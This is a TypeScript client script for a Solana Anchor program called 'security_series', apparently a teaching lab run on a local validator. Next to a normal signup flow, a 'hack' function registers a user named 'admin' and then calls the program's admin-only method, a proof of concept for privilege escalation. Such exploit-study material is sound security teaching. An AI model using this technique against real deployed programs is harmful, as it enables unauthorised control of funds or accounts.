import { AnchorProvider, BN, Program, Wallet, web3 } from "@coral-xyz/anchor"
import { SecuritySeries, IDL} from "../target/types/security_series"
const kpFile = "../2ndVbymu2MG5C95YU4bcb5KvM2PkWhVkdfkhuNhk78UH.json"
const fs = require("fs")
const kp : web3.Keypair = web3.Keypair.fromSecretKey(
  new Uint8Array(JSON.parse(fs.readFileSync(kpFile).toString())),
);
const wallet = new Wallet(kp);
const c = new web3.Connection("http://localhost:8899")
const provider = new AnchorProvider(c, wallet, {});
const programId = new web3.PublicKey("SECmF7dX572jE1S6KGchN6uxi9TMXwPZWUwArfQdgYn")
const program = new Program<SecuritySeries>(IDL, programId, provider)

async function intended() {
    const name = "my first user account";
    const sx = await program.methods.userSignup(name)
    .accounts({
        user: kp.publicKey,
        systemProgram: web3.SystemProgram.programId
    })
    .rpc();
    console.log(sx)
    
    const sx2 = await program.methods.doUserStuff(name)
    .accounts({
        user: kp.publicKey,
    })
    .rpc();
    console.log(sx2)
}
// intended();


async function hack() {
  const name = "admin";
  const sx = await program.methods.userSignup(name)
  .accounts({
      user: kp.publicKey,
      systemProgram: web3.SystemProgram.programId
  })
  .rpc({commitment: "finalized"});
  console.log(sx)
  
  await tryAdmin();
}
// hack();

tryAdmin();
async function tryAdmin() {
  const sx = await program.methods.doAdminStuff()
  .accounts({
      admin: kp.publicKey
  })
  .rpc();
  console.log(sx)
  
}